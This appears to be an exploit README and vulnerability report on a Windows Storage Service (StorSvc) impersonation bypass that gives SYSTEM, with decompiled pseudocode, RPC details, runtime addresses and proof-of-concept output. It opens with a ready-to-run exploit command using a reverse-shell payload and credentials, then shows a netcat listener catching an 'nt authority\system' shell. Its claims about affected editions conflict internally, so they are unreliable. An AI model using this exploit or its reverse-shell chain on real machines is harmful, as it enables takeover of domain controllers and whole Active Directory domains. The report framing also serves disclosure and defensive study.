# Using storsvc_exploit.py

On a Windows10 or Windows11 machine we do not need StoragePool as StorageSpace already exists by default. 

We are doing skip-setup as this was made to setup a share and setup the %PATH%, if you cannot write to a %PATH% this exploit will not work for a reverse shell as it is using a phantom DLL.

You get one-shot, so if you run it and mess up, the machine would need to be restarted. You cannot run again as the StorSvc will be in a state where it is not able to recover.

```
python3 /home/kali/dll-research/poc/storsvc_exploit.py \
  -t 192.168.15.239 \
  -u yager \
  -p 'P@ssw0rd!' \
  --payload reverse \
  --lhost 192.168.15.157 \
  --lport 443 \
  --skip-setup
```

With a listener listening on port 443:

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.15.157] from (UNKNOWN) [192.168.15.239] 58319
Microsoft Windows [Version 10.0.26100.8457]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
whoami
nt authority\system
```


# StorSvc-Impersonation-Bypass

An authenticated domain user can trigger SYSTEM-level DeleteFileW and CreateDirectoryW on the DC. The file path is derived from the tier entry's path field (populated by the StorageManager) with the hardcoded suffix "WindowsApps" appended.

```
4.2 Exploitation Chain
Precondition: StorSvc must be running (it starts automatically or on-demand), and the tier arrays must contain valid entries with a path pointing to a user-controllable directory.
Trigger: Low-privilege user calls opnum 17 via ALPC (ncalrpc) with enum_type=1, level=0.
Result: VULN function runs as SYSTEM. DeleteFileW attempts to delete the constructed path. CreateDirectoryW creates a directory at the constructed path.
Escalation: Using NTFS junctions and Object Manager symlinks, the DeleteFileW primitive can be redirected to delete an arbitrary file as SYSTEM. Combined with DLL hijacking, this enables arbitrary code execution as SYSTEM.
4.3 Impact Assessment
Impact: Any authenticated domain user can escalate to NT AUTHORITY\SYSTEM on a Domain Controller. This represents a complete compromise of the DC and, by extension, the entire Active Directory domain. An attacker with a single low-privilege domain account can:
5. Proof of Concept
5.1 Environment
Component	Details
Target OS	Windows Server 2022 (Build 20348) — Domain Controller
Domain	cve.local
Target IP	192.168.15.172
Low-priv user	CVE\testpoc (standard domain user, no special privileges)
StorSvc PID	2468 (svchost.exe instance)
storsvc.dll base	0x7FFCE0A30000
5.2 Key Addresses
Symbol	RVA	Runtime Address
StorageManager global	0xF2E10	0x7FFCE0B22E10
Opnum 17 handler	0x2BF78	0x7FFCE0A5BF78
VULN (FUN_180027eac)	0x27EAC	0x7FFCE0A57EAC
helper1	0x27D20	0x7FFCE0A57D20
func_2E4F0	0x2E4F0	0x7FFCE0A5E4F0
RPC Interface	0xB5430	0x7FFCE0AE5430
JS patch target	op17+0x78	0x7FFCE0A5BFF0
5.3 Reproduction Steps
Ensure StorSvc is running on the DC (Start-Service StorSvc).
Populate the tier array entries with a path pointing to a user-writable directory (e.g., C:\temp\storsvc_work\poc_vuln). In a real scenario, this data is populated through normal StorSvc operations on systems with Storage Spaces configured.
Bypass the func_2E4F0 storage pool validation (this check is unrelated to the impersonation bug and simply gates access to the VULN function on systems without Storage Spaces).
As user testpoc, call opnum 17 via RPC with enum_type=1, level=0.
Observe that CreateDirectoryW creates a directory owned by NT AUTHORITY\SYSTEM.
5.4 Confirmed Results
[*] StorSvc Trigger v29 — user=testpoc
[+] ALPC=OLE3A8D3E5A6A7346A787F86CFF3F54
[*] op17(e=1,l=0): len=8 0x801F000F v1=0x00000000
[+] *** VULN TRIGGERED ***
[+] Directory C:\temp\storsvc_work\poc_vuln\WindowsApps created!
[+] Owner: NT AUTHORITY\SYSTEM
[+] ACL: CVE\testpoc → FullControl (Allow)
[+] ACL: Everyone → FullControl (Allow)
[+] ACL: NT AUTHORITY\SYSTEM → FullControl (Allow)
[+] ACL: BUILTIN\Administrators → FullControl (Allow)
Key evidence: The directory was created by testpoc's RPC call but is owned by NT AUTHORITY\SYSTEM, proving that CreateDirectoryW executed without impersonation. StorSvc (PID 2468) remained running after exploitation — no crash occurred.
```

Note on Scope: While the immediate impact is local (SYSTEM on the DC), the strategic impact of compromising a Domain Controller effectively compromises the entire AD forest. If Scope is evaluated as Changed (attacker crosses authorization boundary from user to SYSTEM), the score would increase to 8.8 (High).

7. Affected Versions
Confirmed: Windows Server 2022 (Build 20348) — Domain Controller role
Potentially affected: Any Windows Server version with StorSvc containing the same SKU check logic in FUN_180027eac. This includes Windows Server 2019 and Windows Server 2025 if they share the same storsvc.dll code path. Testing on additional versions recommended.
Not affected: Workstation editions (product type 1) and non-DC Server editions (product type 3) correctly call RpcImpersonateClient.

```
9. Additional Technical Details
9.1 RPC Interface
Field	Value
UUID	d8140e00-5c46-4ae6-80ac-2f9a76df224c
Protocol	ncalrpc (ALPC)
Auth Level	PKT_PRIVACY (6) with NTLM (10)
Vulnerable Opnum	17
Parameters	DWORD enum_type, DWORD level (8 bytes wire format)
9.2 StorageManager Internal Layout
// Global singleton at storsvc.dll + 0xF2E10
struct StorageManager {
    // ...
    TierArray* tier0;     // offset +0x28
    TierArray* tier1;     // offset +0x30
    // ...
};

// Each tier entry: 0x450 bytes
struct TierEntry {
    DWORD flags;          // +0x000
    WCHAR path[258];      // +0x004
    DWORD status;         // +0x210 (0=valid, 2=uninitialized)
    // ...
    DWORD bitfield;       // +0x234
};
9.3 Source Path Hints (from PDB/strings)
onecore\drivers\storage\storsvc\service\storageservice.cpp
onecore\drivers\storage\storsvc\service\storagepolicy.cpp
onecore\drivers\storage\storsvc\service\storageregistryhelper.h
python3 poc.py
Expected output
[*] Step 4: Trigger op17 as testpoc (low-priv)
======================================================================
[*] StorSvc Trigger v29 - user=testpoc
[*] Target: C:\temp\storsvc_work\poc_vuln\WindowsApps
[*] Before: exists=False
[+] ALPC=LRPC-6c3f371894a2b3b850
[*] op17(e=1,l=0): len=8 0x801F000F(0x801F000F) v1=0x00000000 <<< NEW
[+] *** VULN TRIGGERED ***
[+] Directory C:\temp\storsvc_work\poc_vuln\WindowsApps created!
[+] Owner: NT AUTHORITY\SYSTEM
[+] ACL: CVE\testpoc ␦ FullControl (Allow)
[+] ACL: Everyone ␦ FullControl (Allow)
[+] ACL: NT AUTHORITY\SYSTEM ␦ FullControl (Allow)
[+] ACL: BUILTIN\Administrators ␦ FullControl (Allow)
[+] ACL: BUILTIN\Users ␦ ReadAndExecute, Synchronize (Allow)
[+] ACL: BUILTIN\Users ␦ AppendData (Allow)
[+] ACL: BUILTIN\Users ␦ CreateFiles (Allow)
[+] ACL: CREATOR OWNER ␦ 268435456 (Allow)
[*] === FINAL ===
[*] WindowsApps exists: True

[*] Step 5: Verify + unpatch
======================================================================
[+] WindowsApps exists: True
[+] Owner: NT AUTHORITY\SYSTEM
[+] C:\temp\storsvc_work\poc_vuln\WindowsApps CVE\testpoc:(I)(OI)(CI)(F)
[+]                                           Everyone:(I)(OI)(CI)(F)
[+]                                           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
[+]                                           BUILTIN\Administrators:(I)(OI)(CI)(F)
[+]                                           BUILTIN\Users:(I)(OI)(CI)(RX)
[+]                                           BUILTIN\Users:(I)(CI)(AD)
[+]                                           BUILTIN\Users:(I)(CI)(WD)
[+]                                           CREATOR OWNER:(I)(OI)(CI)(IO)(F)
[+]
[+] Successfully processed 1 files; Failed processing 0 files
[+] StorSvc state=Running pid=2468
[+] storsvc.dll=0x7FFCE0A30000
[*] === UNPATCHING ===
[*] Current: 90 90 90 90 90 90
[+] Restored original JS instruction
Description
Microsoft Security Vulnerability Report
StorSvc (Windows Storage Service) Impersonation Bypass on Domain Controllers

Field	Value
Component	storsvc.dll
Service	StorSvc (Storage Service)
Severity	HIGH — CVSS 7.8
Impact	Elevation of Privilege: Authenticated User → NT AUTHORITY\SYSTEM
Affected	Windows Server 2022 Domain Controllers
Date Discovered	2026-10-03
1. Executive Summary
Critical Finding: A bitwise logic error in the Windows Storage Service (storsvc.dll) causes RpcImpersonateClient to be skipped on Domain Controllers, allowing any authenticated domain user to trigger DeleteFileW and CreateDirectoryW operations running as NT AUTHORITY\SYSTEM via a local RPC call.

The StorSvc service runs as NT AUTHORITY\SYSTEM and exposes an RPC interface (d8140e00-5c46-4ae6-80ac-2f9a76df224c) accessible to all authenticated users via ALPC. When a client calls opnum 17, the service performs file operations (delete + create directory) on paths derived from internal data structures. Before executing these operations, the service checks the Windows product type (SKU) to decide whether to impersonate the calling user. Due to an incorrect bitmask in the SKU check, Domain Controllers (product type 2) are excluded from the impersonation path, causing file operations to execute with the full SYSTEM token.

This vulnerability enables a low-privilege authenticated user to trigger arbitrary file deletion and directory creation as SYSTEM on any Domain Controller running the affected StorSvc version. Combined with NTFS junction and Object Manager symlink techniques, this can be escalated to full SYSTEM code execution.

2. Root Cause Analysis
2.1 The SKU Check — Incorrect Bitmask
The vulnerable function FUN_180027eac (hereafter VULN) calls FUN_18002198c to retrieve the Windows product type via GetProductInfo or RtlGetNtProductType. It then evaluates the following condition to decide whether to impersonate the RPC client:

// Pseudocode from Ghidra decompilation — FUN_180027eac
DWORD product_type = FUN_18002198c();  // returns: 1=Workstation, 2=DC, 3=Server

// The SKU check that controls impersonation
if (param_8 != 0 && ((product_type - 1) & 0xFFFFFFFD) == 0) {   // ← BUG
    RpcImpersonateClient(NULL);   // impersonate the calling user
    bImpersonating = TRUE;
}

// ... path construction ...

// File operations — run as SYSTEM if impersonation was skipped
dwAttrs = GetFileAttributesW(constructed_path);
if (dwAttrs != INVALID_FILE_ATTRIBUTES && !(dwAttrs & FILE_ATTRIBUTE_DIRECTORY)) {
    DeleteFileW(constructed_path);      // ← RUNS AS SYSTEM ON DCs
}
CreateDirectoryW(constructed_path, pSecAttrs);   // ← RUNS AS SYSTEM ON DCs

// Revert only if impersonation occurred
if (bImpersonating) {
    RpcRevertToSelf();
}
2.2 Bitmask Truth Table
The expression (product_type - 1) & 0xFFFFFFFD evaluates as follows:

Product Type	Value	value - 1	(value - 1) & 0xFFFFFFFD	Result	Impersonation
Workstation	1	0 = 0b...0000	0	== 0 ✓	Called
Domain Controller	2	1 = 0b...0001	1	!= 0 ✗	SKIPPED (BUG)
Server	3	2 = 0b...0010	0	== 0 ✓	Called
Analysis: The mask 0xFFFFFFFD clears bit 1 (value & ~2). After subtracting 1 from the product type, Workstation (0) and Server (2) both have only bit 1 set (or no bits set), so masking produces 0. But Domain Controller gives 1, which has bit 0 set — not cleared by this mask — resulting in a non-zero value that fails the == 0 check. This means DCs are the only SKU where impersonation is skipped.

3. Vulnerable Code Flow (Full Call Chain)
Below is the complete execution path from the RPC entry point to the SYSTEM file operations. Each step shows the function involved and the critical code it executes.

Step 1: RPC Dispatch → Opnum 17 Handler
RVA 0x2BF78 — The RPC runtime dispatches the client call to the opnum 17 handler in storsvc.dll. This function receives two DWORD parameters: enum_type and level.

// Opnum 17 handler (RVA 0x2BF78, 841 bytes)
// Interface UUID: d8140e00-5c46-4ae6-80ac-2f9a76df224c
//
// Loads the global StorageManager singleton:
StorageManager* globalMgr = *(StorageManager**)(RIP_relative → RVA 0xF2E10);

// Resolves the tier index from parameters
int resolved_index = resolve_index(enum_type, level);

// Calls helper1 to validate the tier entry exists
HRESULT hr = helper1(globalMgr, enum_type, resolved_index);
if (FAILED(hr)) return hr;

// Calls func_2E4F0 for storage pool validation
hr = func_2E4F0(globalMgr, enum_type, resolved_index);
if (hr < 0) goto error;   // ← JS instruction at +0x78 (bypassed on exploit)

// ... additional validation ...

// Calls VULN with hardcoded "WindowsApps" suffix
hr = VULN(globalMgr, enum_type, resolved_index, L"WindowsApps", 1, NULL, NULL, 0);
return hr;
Step 2: helper1 — Tier Array Entry Lookup
RVA 0x27D20 — Validates that tier array entries exist at the requested index. Reads from the StorageManager's internal tier arrays at offsets +0x28 (tier0) and +0x30 (tier1).

// helper1 (RVA 0x27D20, 128 bytes)
// Each tier is an array of entries, each 0x450 bytes:
//   +0x000: DWORD flags
//   +0x004: WCHAR path[~258]     // volume/directory path
//   +0x210: DWORD status         // 0=valid, 2=uninitialized

TierEntry* tier_array;
if (enum_type == 1)
    tier_array = globalMgr->tier1;   // at globalMgr+0x30
else
    tier_array = globalMgr->tier0;   // at globalMgr+0x28

// Validates entry at resolved_index has data
if (tier_array[resolved_index].path[0] == L'\0')
    return HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND);
return S_OK;
Step 3: func_2E4F0 — Storage Pool Validation
RVA 0x2E4F0 — Checks storage pool configuration. Returns E_INVALIDARG on DCs without Storage Spaces configured. This result triggers a JS (Jump if Sign) at op17+0x78 that branches to the error return path.

// func_2E4F0 (RVA 0x2E4F0)
// On a DC without Storage Spaces:
//   - Queries WMI/VDS for storage pool configuration
//   - Finds no pools → returns E_INVALIDARG (0x80070057)
//
// In op17, the JS instruction at +0x78 checks this result:
//   0F 88 9F 02 00 00    JS +0x29F  (jump to error if SF=1, i.e., hr < 0)
//
// This JS blocks the path to VULN on default DC configurations.
// Proof of concept bypasses this by NOPing the 6-byte JS instruction.
Step 4: FUN_18002198c — Product Type Query
RVA 0x2198C — Called by VULN to determine the Windows edition. Returns the NtProductType value used in the impersonation decision.

// FUN_18002198c — returns product type
// Uses GetProductInfo() or RtlGetNtProductType()
//
// Return values:
//   1 = VER_NT_WORKSTATION      (Windows 10/11 client)
//   2 = VER_NT_DOMAIN_CONTROLLER (Domain Controller)
//   3 = VER_NT_SERVER           (Member Server)
Step 5: VULN (FUN_180027eac) — Privileged File Operations [VULNERABLE]
RVA 0x27EAC — The core vulnerable function. Constructs a file path from the tier entry and appends the hardcoded suffix (e.g., "WindowsApps"). Then makes the flawed SKU check to decide whether to impersonate, and executes DeleteFileW + CreateDirectoryW.

// FUN_180027eac — VULN (RVA 0x27EAC)
// Parameters:
//   param_1 = globalMgr (StorageManager*)
//   param_2 = enum_type
//   param_3 = resolved_index
//   param_4 = L"WindowsApps"        // hardcoded suffix
//   param_5 = 1
//   param_6 = NULL (SECURITY_ATTRIBUTES*)
//   param_7 = NULL
//   param_8 = 0 or 1                // controls impersonation gate

WCHAR path[MAX_PATH];

// Get tier entry path
TierEntry* entry = get_tier_entry(param_1, param_2, param_3);
wcscpy_s(path, MAX_PATH, entry->path);

// Append suffix
PathCchAppend(path, MAX_PATH, param_4);  // e.g., "C:\...\WindowsApps"

// ┌──────────────────────────────────────────────────────────┐
// │ THE BUG: SKU check that controls impersonation           │
// │                                                          │
// │  DWORD sku = FUN_18002198c();                            │
// │  BOOL bImpersonating = FALSE;                            │
// │                                                          │
// │  if (param_8 != 0 && ((sku - 1) & 0xFFFFFFFD) == 0) {   │
// │      RpcImpersonateClient(NULL);                         │
// │      bImpersonating = TRUE;                              │
// │  }                                                       │
// │                                                          │
// │  On DC (sku=2): (2-1) & 0xFFFFFFFD = 1 ≠ 0              │
// │  → impersonation SKIPPED                                 │
// │  → all operations below run as NT AUTHORITY\SYSTEM       │
// └──────────────────────────────────────────────────────────┘

// File operations (as SYSTEM on DC, as client on workstation/server)
DWORD attrs = GetFileAttributesW(path);
if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
    DeleteFileW(path);              // SYSTEM delete
}
CreateDirectoryW(path, param_6);    // SYSTEM directory creation

// Revert (never reached on DC since bImpersonating is FALSE)
if (bImpersonating) {
    RpcRevertToSelf();
}

return S_OK;
```
